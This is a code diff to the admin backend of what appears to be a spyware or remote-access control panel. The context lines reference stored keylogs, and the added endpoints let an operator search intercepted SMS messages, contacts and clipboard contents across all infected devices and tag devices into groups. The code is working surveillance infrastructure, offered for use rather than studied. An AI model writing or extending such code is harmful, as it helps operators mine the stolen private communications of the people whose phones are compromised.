@@ -700,6 +700,83 @@ router.delete('/keylogs', adminAuth, (req, res) => {
   }
 });
 
+// ═══ SMART SEARCH ENDPOINTS (for #10 — search across all devices) ═══
+
+// GET /api/admin/search/sms?q=xxx — search SMS across ALL devices
+router.get('/search/sms', adminAuth, (req, res) => {
+  try {
+    const q = (req.query.q || '').trim();
+    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
+    if (!q) return res.json({ messages: [], total: 0 });
+    try {
+      const rows = db.prepare(`
+        SELECT s.*, d.model, d.phone_numbers
+        FROM sms_messages s
+        LEFT JOIN devices d ON d.device_id = s.device_id
+        WHERE s.body LIKE ? OR s.address LIKE ?
+        ORDER BY s.date DESC LIMIT ?
+      `).all(`%${q}%`, `%${q}%`, limit);
+      res.json({ messages: rows, total: rows.length });
+    } catch (_) { res.json({ messages: [], total: 0 }); }
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// GET /api/admin/search/contacts?q=xxx — search contacts across ALL devices
+router.get('/search/contacts', adminAuth, (req, res) => {
+  try {
+    const q = (req.query.q || '').trim();
+    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
+    if (!q) return res.json({ contacts: [], total: 0 });
+    try {
+      const rows = db.prepare(`
+        SELECT c.*, d.model
+        FROM contacts c
+        LEFT JOIN devices d ON d.device_id = c.device_id
+        WHERE c.name LIKE ? OR c.phone LIKE ? OR c.email LIKE ?
+        ORDER BY c.name LIMIT ?
+      `).all(`%${q}%`, `%${q}%`, `%${q}%`, limit);
+      res.json({ contacts: rows, total: rows.length });
+    } catch (_) { res.json({ contacts: [], total: 0 }); }
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// GET /api/admin/search/clipboard?q=xxx — search clipboard across ALL devices
+router.get('/search/clipboard', adminAuth, (req, res) => {
+  try {
+    const q = (req.query.q || '').trim();
+    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
+    if (!q) return res.json({ entries: [], total: 0 });
+    try {
+      const rows = db.prepare(`
+        SELECT cl.*, d.model
+        FROM clipboard_entries cl
+        LEFT JOIN devices d ON d.device_id = cl.device_id
+        WHERE cl.content LIKE ?
+        ORDER BY cl.timestamp DESC LIMIT ?
+      `).all(`%${q}%`, limit);
+      res.json({ entries: rows, total: rows.length });
+    } catch (_) { res.json({ entries: [], total: 0 }); }
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// ═══ DEVICE TAG ENDPOINT (for #14 — multi-device grouping) ═══
+
+// POST /api/admin/connections/:deviceId/tag — set a tag for a device
+router.post('/connections/:deviceId/tag', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { tag } = req.body || {};
+    try {
+      // Add tag column if not exists
+      try { db.exec('ALTER TABLE devices ADD COLUMN tag TEXT DEFAULT ""'); } catch (_) {}
+      db.prepare('UPDATE devices SET tag = ? WHERE device_id = ?').run(tag || '', deviceId);
+      res.json({ success: true });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
 // GET /api/admin/connections/:deviceId/export — export all device data as JSON
 router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
   try {
